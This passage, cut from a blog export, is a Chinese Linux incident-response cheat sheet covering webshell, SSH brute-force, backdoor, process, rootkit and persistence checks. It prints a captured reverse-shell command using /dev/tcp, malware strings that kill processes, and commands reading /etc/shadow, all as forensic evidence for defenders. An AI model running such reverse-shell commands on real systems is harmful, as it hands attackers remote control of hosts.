目录。\n\n需要注意这条命令局限性就是只能检查通过RPM包安装的所有文件。另外为了防止rpm也被替换，上传一个安全干净稳定版本rpm二进制到服务器上进行检查。\n\n我们可以对系统中所有 RPM 文件做一个全面检查\n\n```shell\nrpm -aV\n#查看bash\nrpm -Vf /bin/bash\n```\n\n\n\n```shell\nS: 表示文件长度发生了变化\nM: 表示文件的访问权限或文件类型发生了变化\n5: 表示MD5校验和发生了变化。\nD: 表示设备节点的属性发生了变化\nL: 表示文件的符号链接发生率变化\nU: 表示文件/子目录/设备节点的owner发生了变化\nG: 表示文件/子目录/设备节点的group发生了变化\nT: 表示文件最后一次的修改时间发生了变化\n```\n\n4）使用chkrootkit和rkhunter查看\n\n# 0x10 病毒检测\n\n```html\nhttps://x.threatbook.cn/\nhttp://www.virscan.org\nhttps://www.virustotal.com/\nhttps://fireeye.ijinshan.com/\n```\n\n# 0x11 文件权限\n\n一般是使用chattr或者setfacl来设置权限。\n\nchattr可以修改属性能够提高系统的安全性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录，常用参数如下：\n\n```\na：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。\n\ni：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。\n\ns：保密性地删除文件或目录，即硬盘空间被全部收回。\n\nu：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。\n```\n\n例子：\n\n设置/etc/resolv.conf为不可修改\n\n```shell\n[root@vincent tmp]# chattr +i /etc/resolv.conf\n\n[root@vincent tmp]# lsattr /etc/resolv.conf\n\n----i--------e- /etc/resolv.conf\n\n[root@vincent tmp]# echo \"\" > /etc/resolv.conf\n\n-bash: /etc/resolv.conf: 权限不够\n```\n\n可以使用lsattr查看文件权限\n\nsetfacl其实是设置文件的访问控制列表，传统的 Linux 文件系统的权限控制是通过 user、group、other 与 r(读)、w(写)、x(执行) 的不同组合来实现的，同时存在不灵活的问题， 例如目录 /data 的权限为：drwxr-x—，所有者与所属组均为 root，在不改变所有者的前提下，要求用户 tom 对该目录有完全访问权限 (rwx).考虑以下2种办法 (这里假设 tom 不属于 root group)\n\n(1) 给 /data 的 other 类别增加 rwx permission，这样由于 tom 会被归为 other 类别，那么他也将拥有 rwx 权限。\n\n(2) 将 tom 加入到 root group，为 root group 分配 rwx 权限，那么他也将拥有 rwx 权限。\n\n以上 2 种方法其实都不合适，为了解决这些问题，Linux 开发出了一套新的文件系统权限管理方法，叫文件访问控制列表 (Access Control Lists, ACL)。简单地来说，ACL 就是可以设置特定用户或者用户组对于一个文件的操作权限。文件的所有者以及有CAP_FOWNER（在目前的linux系统上，root用户是唯一有CAP_FOWNER能力的用户）的用户进程可以设置一个文件的acl。ACL 有两种，一种是access ACL，针对文件和目录设置访问控制列表。一种是default ACL，只能针对目录设置。如果目录中的文件没有设置 ACL，它就会使用该目录的默认 ACL.\n\ngetfacl获取文件权限\n\nsetfacl设置Access ACL\n\n```shell\nsetfacl -m u:root:rwx {file}\n#取消ACL\nsetfacl -b {file}\n```\n\n# 参考链接\nhttp://vinc.top/2017/09/20/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A7%BF%E5%8A%BF/\n\nhttps://mp.weixin.qq.com/s/ZUJ87wWbzccw_zSRADfCVg\n\nhttps://mp.weixin.qq.com/s/xodT25Pn3fW1xHrU0IhBDQ\n\nhttps://mp.weixin.qq.com/s/Z0kBcwy379x_J-Xm2Y-Vlg\n\nhttps://www.xsec.io/2018/8/31/emergency-response.html\n\nhttps://www.freebuf.com/articles/network/186071.html\n\nhttps://github.com/iamckn/backdoors\n\nhttps://mp.weixin.qq.com/s/1I0MpWXcyJoe5zGFLnv8gw\n\nhttps://mp.weixin.qq.com/s/-T9wupsSfW1Q73ocPgvMBg\n\nhttps://mp.weixin.qq.com/s/s0Rvlzrwx6uW_Po5AcusnQ\n\nhttps://mp.weixin.qq.com/s/tu3c0l_2Bu4kNGqp3tlxKw","slug":"应急响应整理","published":1,"updated":"2019-06-19T17:23:13.403Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istl400ad4dsbprrq0i0t","content":"<h1 id=\"0x01-Web服务\"><a href=\"#0x01-Web服务\" class=\"headerlink\" title=\"0x01 Web服务\"></a>0x01 Web服务</h1><p>1) 检测最近创建的文件和上传目录</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">查找24小时内被修改的php文件</span></span><br><span class=\"line\">find ./ -mtime 0 -name \"*.php\"</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> n+1天前</span></span><br><span class=\"line\">find ./ -mtime +n -name \"*.php\" </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> n天内</span></span><br><span class=\"line\">find ./ -mtime -n -name \"*.php\"</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">具体还有 atime ctime</span></span><br></pre></td></tr></table></figure>\n\n<p>2) 与测试环境目录做对比</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff -r &#123;生产dir&#125; &#123;测试dir&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3) 使用Webshell查杀工具</p>\n<p>Windows下D盾等，Linux下河马等。</p>\n<p>4) 创建Audit审计规则</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/audit/audit.rules</span><br><span class=\"line\">-a exclude,always -F msgtype=CONFIG_CHANGE</span><br><span class=\"line\">-a exit,always -F arch=b64 -F uid=48 -S execve -k webshell</span><br></pre></td></tr></table></figure>\n\n<p>1）扫描特征</p>\n<p>通常入侵行为会伴随着踩点和扫描行为，那么可以查一下具有扫描行为的日志。</p>\n<p>例如使用AWVS扫描：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep 'acunetix' /var/log/httpd/access_log</span><br></pre></td></tr></table></figure>\n\n<p>例如使用sqlmap，但是没有使用–random-agent，UA中带有sqlmap</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep 'sqlmap' /var/log/httpd/access_log</span><br></pre></td></tr></table></figure>\n\n<p>2）孤立页面</p>\n<p>referer为 – 的php页面</p>\n<p>3）Content-Length</p>\n<p>攻击者打包回传，过滤Content-Length大于5M的日志</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk '&#123;if($10&gt;5000000)&#123;print $0&#125;&#125;' /var/log/httpd/access_log</span><br></pre></td></tr></table></figure>\n\n<p>需要注意这里如果发现疑似Webshell文件，先用stat记录下时间点，不要直接用vim查看编辑文件内容，这样会更改文件的mtime，对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。</p>\n<h1 id=\"0x02-SSH服务\"><a href=\"#0x02-SSH服务\" class=\"headerlink\" title=\"0x02 SSH服务\"></a>0x02 SSH服务</h1><p>1)  系统账号情况</p>\n<ol>\n<li>查看特权用户</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk -F: '$3==0&#123;print $1&#125;' /etc/passwd</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>查看可以远程登录的帐号信息</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk '/\\$1|\\$6/&#123;print $1&#125;' /etc/shadow</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>sudo权限权限用户，非必须可删除<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\"</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p>2）登录情况</p>\n<ol>\n<li>查看失败次数</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep -o \"Failed password\" /var/log/secure|uniq -c</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>输出登录爆破的第一行和最后一行，确认爆破时间范围</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep \"Failed password\" /var/log/secure|head -1</span><br><span class=\"line\">grep \"Failed password\" /var/log/secure|tail -1</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><p>定位爆破ip</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c | sort -nr</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看爆破用户名字典</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep \"Failed password\" /var/log/secure| perl -e 'while($_=&lt;&gt;)&#123; /for(.*?) from/; print \"$1\\n\";&#125;' |uniq -c|sort -nr</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>登录成功：</p>\n<p>登录成功的日期、用户名、IP</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep \"Accepted \" /var/log/secure | awk '&#123;print $1,$2,$3,$9,$11&#125;'</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p>​            登录成功的IP</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep 'Accepted' /var/log/secure | awk '&#123;print $11&#125;' | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>\n\n<p>​            或者last，它会读取位于/var/log/wtmp的文件。</p>\n<ol start=\"6\">\n<li>登录失败：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep 'Failed' /var/log/secure | awk '&#123;print $11&#125;' | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>\n\n<p>或者lastb，会读取位于/var/log/btmp的文件</p>\n<p>3）检查SSH后门方式：</p>\n<ol>\n<li>比对ssh的版本</li>\n</ol>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">ssh -V</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>查看ssh配置文件和/usr/sbin/sshd的时间</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">stat /etc/ssh/sshd_config</span><br><span class=\"line\">stat /usr/sbin/sshd</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>strings检查/usr/sbin/sshd，看是否有邮箱信息</li>\n</ol>\n<p>strings可以查看二进制文件中的字符串，在应急响应中是十分有用的。有些sshd后门会通过邮件发送登录信息，通过</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings /usr/sbin/sshd</span><br></pre></td></tr></table></figure>\n\n<p>可以查看到邮箱信息。</p>\n<ol start=\"4\">\n<li>通过strace监控sshd进程读写文件的操作</li>\n</ol>\n<p>一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps axu | grep sshd | grep -v grep</span><br><span class=\"line\"></span><br><span class=\"line\">root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd</span><br><span class=\"line\"></span><br><span class=\"line\">strace -o aa -ff -p 65530</span><br><span class=\"line\"></span><br><span class=\"line\">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class=\"line\"></span><br><span class=\"line\">aa.102586:open(\"/tmp/ilog\", O_WRONLY|O_CREAT|O_APPEND, 0666) = 4</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x03-进程\"><a href=\"#0x03-进程\" class=\"headerlink\" title=\"0x03 进程\"></a>0x03 进程</h1><p>检查是否存在可疑进程，需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，进程可能会隐藏。</p>\n<p>1）系统负载</p>\n<p>例如挖矿程序特征就是系统负载高。使用Top命令查看</p>\n<p>按照CPU排序：Shift+P</p>\n<p>按照MEM排序：Shift+M</p>\n<p>2）启动时间</p>\n<p>与前面找到的Webshell时间点比对。</p>\n<p>3）启动权限</p>\n<p>木马进程以mysql权限执行的，可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。</p>\n<p>4）父进程</p>\n<ol>\n<li>菜刀中反弹Bash</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">[root@server]#</span><span class=\"bash\">ps -ef | grep <span class=\"string\">'/dev/tcp'</span> | grep -v grep</span></span><br><span class=\"line\"></span><br><span class=\"line\">apache   26641  1014  0 14:59 ?        00:00:00 sh -c /bin/sh -c \"cd /root/apache-tomcat-6.0.32/webapps/ROOT/;bash -i &gt;&amp; /dev/tcp/192.168.192.144/2345 0&gt;&amp;1;echo [S];pwd;echo [E]\" 2&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">[root@server]#</span><span class=\"bash\">ps -ef | grep 1014</span></span><br><span class=\"line\">apache    1014  1011  0 Sep19 ?        00:00:00 /usr/sbin/httpd</span><br></pre></td></tr></table></figure>\n\n<p>可以看到父进程为apache，就可以判断攻击者通过Web入侵。</p>\n<ol start=\"2\">\n<li>lsof -p pid：查看可疑进程打开的文件</li>\n</ol>\n<p>例如十字病毒，会修改ps和netstat显示的进程名称</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">udp        <span class=\"number\">0</span>      <span class=\"number\">0</span> <span class=\"number\">0.0</span><span class=\"meta\">.0</span><span class=\"meta\">.0</span>:<span class=\"number\">49937</span>               <span class=\"number\">0.0</span><span class=\"meta\">.0</span><span class=\"meta\">.0</span>:*                               <span class=\"number\">131683</span>/ls -la</span><br><span class=\"line\"></span><br><span class=\"line\">udp        <span class=\"number\">0</span>      <span class=\"number\">0</span> <span class=\"number\">0.0</span><span class=\"meta\">.0</span><span class=\"meta\">.0</span>:<span class=\"number\">47584</span>               <span class=\"number\">0.0</span><span class=\"meta\">.0</span><span class=\"meta\">.0</span>:*                               <span class=\"number\">116515</span>/ifconfig</span><br></pre></td></tr></table></figure>\n\n<p>很明显的异常，ls和ifconfig不会存在监听行为。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@DataNode105 admin]# lsof -p 131683</span><br><span class=\"line\"></span><br><span class=\"line\">COMMAND      PID USER   FD   TYPE    DEVICE SIZE/OFF     NODE NAME</span><br><span class=\"line\"></span><br><span class=\"line\">hahidjqzx 131683 root  cwd    DIR      8,98     4096 18087937 /root</span><br><span class=\"line\"></span><br><span class=\"line\">hahidjqzx 131683 root  rtd    DIR      8,98     4096        2 /</span><br><span class=\"line\"></span><br><span class=\"line\">hahidjqzx 131683 root  txt    REG      8,98   625622 24123895 /usr/bin/hahidjqzxs</span><br></pre></td></tr></table></figure>\n\n<p>可疑看到真正的可执行文件是/usr/bin/hahidjqzxs</p>\n<ol start=\"3\">\n<li>file：查看文件类型：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">[root@server]#</span><span class=\"bash\"> file .zl</span></span><br><span class=\"line\"></span><br><span class=\"line\">zl: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>strings：显示二进制的文件中可读字符</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">[root@server]#</span><span class=\"bash\"> strings .zl</span></span><br><span class=\"line\"></span><br><span class=\"line\">rm -f /boot/IptabLes ; rm -f /boot/.IptabLes ; rm -f /boot/IptabLex ; rm -f /boot/.IptabLex ; rm -f /usr</span><br><span class=\"line\"></span><br><span class=\"line\">/IptabLes ; rm -f /usr/.IptabLes ; rm -f /usr/IptabLex ; rm -f /usr/.IptabLex</span><br><span class=\"line\"></span><br><span class=\"line\">netstat -anp | grep \"IptabLes\" |awk '&#123;print $NF&#125;' |cut -d \"/\" -f 1 | xargs kill -9 &gt; /dev/null ;free -m</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> /dev/null</span></span><br><span class=\"line\"></span><br><span class=\"line\">netstat -anp | grep \"IptabLex\" |awk '&#123;print $NF&#125;' |cut -d \"/\" -f 1 | xargs kill -9 &gt; /dev/null ;free -m</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\"> /dev/null</span></span><br></pre></td></tr></table></figure>\n\n<p>例如之前应急遇到的命令替换，通过Strings查看发现有大量的IP地址，就是明显的异常现象。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">[root@server]#</span><span class=\"bash\"> strings /usr/bin/.sshd | egrep <span class=\"string\">'[1-9]&#123;1,3&#125;\\.[1-9]&#123;1,3&#125;\\.'</span></span></span><br><span class=\"line\">8.8.8.8</span><br><span class=\"line\">8.8.4.4</span><br><span class=\"line\">8.8.8.8</span><br><span class=\"line\">61.132.163.68</span><br><span class=\"line\">202.102.192.68</span><br><span class=\"line\">202.102.213.68</span><br><span class=\"line\">58.242.2.2</span><br><span class=\"line\">202.38.64.1</span><br><span class=\"line\">211.91.88.129</span><br><span class=\"line\">211.138.180.2</span><br><span class=\"line\">218.104.78.2</span><br><span class=\"line\">202.102.199.68</span><br><span class=\"line\">202.175.3.3</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x04-网络连接\"><a href=\"#0x04-网络连接\" class=\"headerlink\" title=\"0x04 网络连接\"></a>0x04 网络连接</h1><p>1）短连接</p>\n<p>短连接（short connnection）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。</p>\n<p>例：编写脚本捕捉pid和源文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/bash</span></span><br><span class=\"line\">ip=118.184.15.40</span><br><span class=\"line\">i=1</span><br><span class=\"line\">while :</span><br><span class=\"line\">do</span><br><span class=\"line\">   tmp=`netstat -anplt|grep $ip|awk -F '[/]' '&#123;print $1&#125;'|awk '&#123;print $7&#125;'`</span><br><span class=\"line\"><span class=\"meta\">   #</span><span class=\"bash\"><span class=\"built_in\">echo</span> <span class=\"variable\">$tmp</span></span></span><br><span class=\"line\">   if test -z \"$tmp\"</span><br><span class=\"line\">   then</span><br><span class=\"line\">       ((i=i+1)) </span><br><span class=\"line\">   else</span><br><span class=\"line\">       for pid in $tmp; do</span><br><span class=\"line\">           echo \"PID: \"$&#123;pid&#125;</span><br><span class=\"line\">          result=`ls -lh /proc/$pid|grep exe`</span><br><span class=\"line\">          echo \"Process: \"$&#123;result&#125;</span><br><span class=\"line\">          kill -9 $pid</span><br><span class=\"line\">       done</span><br><span class=\"line\">       break</span><br><span class=\"line\">   fi </span><br><span class=\"line\">done</span><br><span class=\"line\">echo \"Total number of times: \"$&#123;i&#125;</span><br></pre></td></tr></table></figure>\n\n<p>2）</p>\n<p>需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，连接可能会被隐藏。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -antlp | grep ESTABLISHED</span><br></pre></td></tr></table></figure>\n\n<p>查看已经建立的网络连接，例如反弹bash</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -antlp | grep EST | grep bash</span><br></pre></td></tr></table></figure>\n\n<p>检查可以监听端口</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -antlp | grep LISTEN</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x05-敏感目录\"><a href=\"#0x05-敏感目录\" class=\"headerlink\" title=\"0x05 敏感目录\"></a>0x05 敏感目录</h1><p>/tmp, /var/tmp, /dev/shm，所有用户都可读，可写，可执行</p>\n<h1 id=\"0x06-history\"><a href=\"#0x06-history\" class=\"headerlink\" title=\"0x06 history\"></a>0x06 history</h1><p>默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。</p>\n<h1 id=\"0x07-开机启动\"><a href=\"#0x07-开机启动\" class=\"headerlink\" title=\"0x07 开机启动\"></a>0x07 开机启动</h1><p>1）CentOS 5系统</p>\n<ol>\n<li>/etc/inittab<br>该文件是可以运行process</li>\n<li>/etc/rc.d/rc.sysinit</li>\n<li>/etc/rc.d/init.d</li>\n<li>/etc/rc.d/rc.local</li>\n</ol>\n<p>2） CentOS 6 </p>\n<ol>\n<li>/etc/init/*.conf</li>\n<li>/etc/rc.d/rc.sysinit</li>\n<li>/etc/rc.d/init.d</li>\n<li>/etc/rc.d/rc.local</li>\n</ol>\n<p>3） CentOS 6 </p>\n<ol>\n<li><p>排查修改的service</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find /usr/lib/systemd/system/ -name \"*.service\" | xargs ls -alt | head -n 5</span><br><span class=\"line\">find /etc/systemd/system/ -name \"*.service\" | xargs ls -alt | head -n 5</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>/etc/rc.d/init.d</p>\n</li>\n<li><p>/etc/rc.d/rc.local<br>不过需要看/etc/rc.d/rc.local是否有x权限。</p>\n</li>\n</ol>\n<h1 id=\"0x08-定时任务\"><a href=\"#0x08-定时任务\" class=\"headerlink\" title=\"0x08 定时任务\"></a>0x08 定时任务</h1><p>一般常用的定时任务crontab -l是用户级别的，保存在/var/spool/cron/{user}，每个用户都可以通过crontab -e编辑自己的定时任务列表。<br>而/etc/crontab是系统级别的定时任务，只有Root账户可以修改。<br>另外在应急的时候需要留意的点还有/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly等周期性执行脚本的目录。</p>\n<h1 id=\"0x09-Rootkit\"><a href=\"#0x09-Rootkit\" class=\"headerlink\" title=\"0x09  Rootkit\"></a>0x09  Rootkit</h1><p>Rootkit功能通常有隐藏文件、进程、连接、模块，网络嗅探，后门，日志擦除，键盘记录（SSH密码记录）等。</p>\n<p>检查命令替换，比较直观的方式就是比较命令的大小和mtime了。</p>\n<p>1）比对命令的大小</p>\n<p>2）查看命令的修改时间，按修改时间排序</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls -alt /bin/ | head -n 5</span><br></pre></td></tr></table></figure>\n\n<p>而比较全面的检测方式有：</p>\n<p>3）rpm -aV</p>\n<p>RPM Database 不仅提供了 RPM 包的查询功能，还提供了对已安装的 RPM 包进行验证的功能。默认情况下，RPM Database 存放在 /var/lib/rpm 目录。</p>\n<p>需要注意这条命令局限性就是只能检查通过RPM包安装的所有文件。另外为了防止rpm也被替换，上传一个安全干净稳定版本rpm二进制到服务器上进行检查。</p>\n<p>我们可以对系统中所有 RPM 文件做一个全面检查</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -aV</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">查看bash</span></span><br><span class=\"line\">rpm -Vf /bin/bash</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">S: 表示文件长度发生了变化</span><br><span class=\"line\">M: 表示文件的访问权限或文件类型发生了变化</span><br><span class=\"line\">5: 表示MD5校验和发生了变化。</span><br><span class=\"line\">D: 表示设备节点的属性发生了变化</span><br><span class=\"line\">L: 表示文件的符号链接发生率变化</span><br><span class=\"line\">U: 表示文件/子目录/设备节点的owner发生了变化</span><br><span class=\"line\">G: 表示文件/子目录/设备节点的group发生了变化</span><br><span class=\"line\">T: 表示文件最后一次的修改时间发生了变化</span><br></pre></td></tr></table></figure>\n\n<p>4）使用chkrootkit和rkhunter查看</p>\n<h1 id=\"0x10-病毒检测\"><a href=\"#0x10-病毒检测\" class=\"headerlink\" title=\"0x10 病毒检测\"></a>0x10 病毒检测</h1><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td 